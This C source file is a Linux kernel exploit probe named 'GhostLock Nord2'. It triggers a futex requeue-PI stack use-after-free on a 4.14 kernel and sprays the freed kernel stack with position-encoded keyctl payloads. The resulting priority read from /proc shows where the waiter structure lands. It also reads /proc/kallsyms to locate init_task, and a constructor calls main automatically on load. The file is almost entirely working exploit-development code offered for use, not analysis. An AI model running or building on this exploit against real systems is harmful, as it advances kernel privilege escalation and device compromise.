/*
 * GhostLock Nord2 - Waiter stack position measurement
 *
 * STRATEGY: Fill kernel stack with position-encoded values using keyctl.
 * keyctl(KEYCTL_UPDATE) copies user data to kernel stack.
 * We fill each 8-byte word with its own offset value.
 * After UAF fires, waiter->prio tells us WHICH offset the waiter is at.
 *
 * The owner thread has prio=50 (RT50 → shows -51 in /proc).
 * So if we see prio=-51, the waiter IS at the owner prio region (not our data).
 * If we see prio= -(N+1) for some N, our word at offset N*8 overlaps waiter->prio.
 *
 * keyctl data layout: each word = its byte offset from start of data.
 * So if waiter->prio reads as value V = offset O:
 *   waiter is at stack position where keyctl data word[O/8] lands.
 *
 * We use a 4KB keyctl payload to cover a wide range.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <linux/keyctl.h>
#include <time.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif

/* rt_mutex_waiter offsets (kernel 4.14) */
#define WAITER_PRIO_OFF  0x18
#define WAITER_TASK_OFF  0x50
#define WAITER_LOCK_OFF  0x58

/* Payload size - must be large enough to cover the depth gap */
#define PAYLOAD_SZ  4096

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;

/* init_task address */
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *name) {
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,name)){fclose(f);return a;}
    fclose(f); return 0;
}

static int get_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    /* Stack UAF trigger */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    /* Stack freed. Wait for spray signal. */
    while(!atomic_load(&g_do_spray)) usleep(50);

    /*
     * RECLAIM ATTEMPT using keyctl.
     * keyctl(KEYCTL_UPDATE, keyid, payload, len) copies payload to kernel
     * stack inside key_update() → keyring_update() chain.
     * Each 4-byte word in payload = its byte offset (for position encoding).
     */
    /* First create a user key */
    int keyid = (int)syscall(SYS_add_key,
        "user", "ghostlock_probe", "init", 4,
        (unsigned int)-4 /* KEY_SPEC_THREAD_KEYRING */);

    if (keyid > 0) {
        /* Build position-encoded payload */
        uint8_t payload[PAYLOAD_SZ];
        for (int i=0; i<PAYLOAD_SZ; i+=4)
            *(uint32_t*)(payload+i) = (uint32_t)i; /* word = its offset */
        /* Overwrite task/lock fields with init_task to avoid crash */
        /* Set all 8-byte words with init_task first */
        for (int i=0; i<PAYLOAD_SZ; i+=8)
            *(uint64_t*)(payload+i) = g_init_task;
        /* Then set 4-byte prio fields (at every possible waiter->prio alignment) */
        for (int off=WAITER_PRIO_OFF; off<PAYLOAD_SZ-4; off+=8)
            *(uint32_t*)(payload+off) = (uint32_t)off; /* encode position */

        /* Update key - this copies payload to kernel stack */
        for (int rep=0; rep<16; rep++) {
            syscall(SYS_keyctl, KEYCTL_UPDATE, keyid, payload, (size_t)PAYLOAD_SZ);
        }
        syscall(SYS_keyctl, KEYCTL_INVALIDATE, keyid, 0, 0);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Stack Position Probe ===\n");

    uint64_t stext = read_sym("_stext");
    if (!stext) { fprintf(stderr,"[!] need kptr_restrict=0\n"); return 1; }
    g_init_task = stext + 0x1c6d300ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    for (int att=0; att<10; att++) {
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        /* Trigger UAF */
        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);

        /* Signal spray */
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(3000);

        /* Trigger UAF read - FUTEX_LOCK_PI walks pi_blocked_on */
        struct timespec ft={0,20000000};
        long r=syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,&ft,NULL,0);
        if(r==0) syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        usleep(3000);

        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d",att,p);
        if (p < 0 && p != -51 && p != -999) {
            int offset = -(p+1); /* prio = -51 → RT50, but we encode: prio = offset */
            fprintf(stderr," <-- ENCODED OFFSET = %d (0x%x) = waiter->prio at keyctl payload[%d]\n",
                    offset, offset, offset);
        } else if (p == -51) {
            fprintf(stderr," (owner RT50 - no reclaim)\n");
        } else {
            fprintf(stderr,"\n");
        }

        pthread_detach(ot); pthread_detach(wt);
        usleep(30000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void) { main(); }
